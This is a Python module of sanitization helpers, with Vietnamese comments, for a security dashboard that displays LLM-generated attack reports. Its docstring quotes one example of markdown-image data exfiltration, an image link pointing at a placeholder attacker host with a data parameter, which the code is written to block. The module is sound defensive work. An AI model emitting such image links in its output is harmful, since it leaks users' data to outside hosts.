"""ui/safe.py: các hàm làm sạch dữ liệu trước khi hiển thị (T5, bảo mật cho chính dashboard).

Quy tắc của dự án:
  1. Mọi giá trị động (log, URL, IP, tên tấn công do LLM sinh, ghi chú của guard...) chỉ được hiển thị bằng
     st.code / st.text / st.dataframe / st.metric (là văn bản thuần), hoặc qua md_escape()/md_text() nếu phải
     đi qua st.markdown.
  2. `unsafe_allow_html=True` CHỈ dùng cho CSS tĩnh và cho badge do các hàm ở đây dựng từ danh sách trắng.
  3. Báo cáo Markdown do LLM sinh ra phải qua sanitize_markdown() (chặn ảnh/liên kết ngoài: ảnh
     ![x](http://kẻ-tấn-công/?d=...) sẽ khiến trình duyệt tự gửi yêu cầu ra ngoài, rò rỉ dữ liệu).
"""
from __future__ import annotations

import html
import ipaddress
import re
from typing import Any, Optional

_CTRL = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]")
_MD_SPECIAL = re.compile(r"([\\`*_{}\[\]()#+\-.!|<>~$&:^])")


def strip_ctrl(s: Any) -> str:
    """Bỏ ký tự điều khiển (giữ \\n và \\t), đổi \\r\\n thành \\n."""
    s = "" if s is None else str(s)
    return _CTRL.sub("", s.replace("\r\n", "\n").replace("\r", "\n"))


def html_escape(x: Any) -> str:
    return html.escape("" if x is None else str(x), quote=True)


def md_escape(x: Any, limit: Optional[int] = None) -> str:
    """Escape để chèn MỘT DÒNG văn bản động vào st.markdown mà không bị hiểu là markdown/HTML/LaTeX/emoji."""
    s = strip_ctrl(x)
    s = re.sub(r"\s*\n\s*", " ", s).strip()
    if limit is not None and len(s) > limit:
        s = s[:limit] + "…"
    return _MD_SPECIAL.sub(r"\\\1", s)


def md_text(x: Any, limit: Optional[int] = None) -> str:
    """Như md_escape nhưng giữ xuống dòng (dòng mới = ngắt dòng cứng của markdown)."""
    s = strip_ctrl(x).strip()
    if limit is not None and len(s) > limit:
        s = s[:limit] + "…"
    return "  \n".join(_MD_SPECIAL.sub(r"\\\1", ln) for ln in s.split("\n"))


def truncate(s: Any, n: int) -> str:
    s = strip_ctrl(s)
    return s if len(s) <= n else s[:n] + f"\n… (đã cắt, còn {len(s) - n} ký tự)"


# ----------------------------------------------------------------------- Markdown do LLM sinh
_IMG = re.compile(r"!\[([^\]]*)\]\s*(?:\([^)]*\)|\[[^\]]*\])")
_LINK = re.compile(r"\[([^\]]*)\]\s*\(([^)]*)\)")
_REFDEF = re.compile(r"^[ ]{0,3}\[[^\]]+\]:[ \t]*\S+.*$", re.M)
_AUTOLINK = re.compile(r"<((?:https?|ftp|mailto|data|javascript|file)[^>\s]*)>", re.I)
_BARE_URL = re.compile(r"(?<![\w`])((?:https?|ftp)://[^\s<>()\[\]`]+)", re.I)


def sanitize_markdown(md: Any) -> str:
    """Vô hiệu hoá ảnh và liên kết trong Markdown do LLM sinh. HTML thô do Streamlit tự escape
    (khi không bật unsafe_allow_html) nên không xử lý ở đây."""
    s = strip_ctrl(md)
    s = _IMG.sub(lambda m: f"[ảnh bị chặn: {m.group(1).strip()[:60]}]" if m.group(1).strip() else "[ảnh bị chặn]", s)
    s = _REFDEF.sub("", s)
    s = _LINK.sub(lambda m: f"{m.group(1)} (`{m.group(2).strip()}`)", s)
    s = _AUTOLINK.sub(lambda m: f"`{m.group(1)}`", s)
    s = _BARE_URL.sub(lambda m: f"`{m.group(1)}`", s)
    return s


# ----------------------------------------------------------------------- Badge (chỉ từ danh sách trắng)
_SEV = {"Low": "sev-low", "Medium": "sev-medium", "High": "sev-high", "Critical": "sev-critical"}
_ACT = {"BLOCK_IP": "act-block", "ISOLATE_HOST": "act-isolate", "REVIEW_LOG": "act-review", "NO_ACTION": "act-none"}
_STATUS = {"new": ("st-new", "Mới"), "confirmed": ("st-confirmed", "Đã xác nhận"),
           "false_positive": ("st-fp", "False Positive"), "resolved": ("st-resolved", "Đã xử lý")}


def _badge(cls: str, label: str, prefix: str = "") -> str:
    return f'<span class="badge {cls}">{html_escape(prefix)}{html_escape(label)}</span>'


def severity_badge(value: Any, prefix: str = "") -> str:
    v = value if isinstance(value, str) and value in _SEV else None
    return _badge(_SEV.get(v, "sev-unknown"), v or "Không rõ", prefix)


def action_badge(value: Any, prefix: str = "") -> str:
    v = value if isinstance(value, str) and value in _ACT else None
    return _badge(_ACT.get(v, "act-unknown"), v or "Không rõ", prefix)


def status_badge(value: Any) -> str:
    cls, label = _STATUS.get(value, ("st-new", "Không rõ")) if isinstance(value, str) else ("st-new", "Không rõ")
    return _badge(cls, label)


# ----------------------------------------------------------------------- IP, tên file, thời gian
def valid_ip(value: Any) -> Optional[str]:
    """Trả về IP đã chuẩn hoá nếu hợp lệ, ngược lại None (không chấp nhận scope id kiểu fe80::1%eth0)."""
    if not isinstance(value, str) or "%" in value:
        return None
    try:
        return str(ipaddress.ip_address(value.strip()))
    except ValueError:
        return None


def is_protected_ip(value: str, protected: Any) -> bool:
    """`protected` là list các IP hoặc CIDR (config.PROTECTED_IPS)."""
    ip = valid_ip(value)
    if not ip:
        return False
    addr = ipaddress.ip_address(ip)
    for item in protected or []:
        try:
            if "/" in str(item):
                if addr in ipaddress.ip_network(str(item), strict=False):
                    return True
            elif addr == ipaddress.ip_address(str(item)):
                return True
        except ValueError:
            continue
    return False


def safe_filename(s: Any, default: str = "file") -> str:
    out = re.sub(r"[^A-Za-z0-9._-]+", "_", "" if s is None else str(s)).strip("._")[:60]
    return out or default


def fmt_duration(sec: Optional[float]) -> str:
    if sec is None:
        return "—"
    sec = float(sec)
    if sec < 60:
        return f"{sec:.1f} s"
    if sec < 3600:
        return f"{sec / 60:.1f} phút"
    return f"{sec / 3600:.1f} giờ"
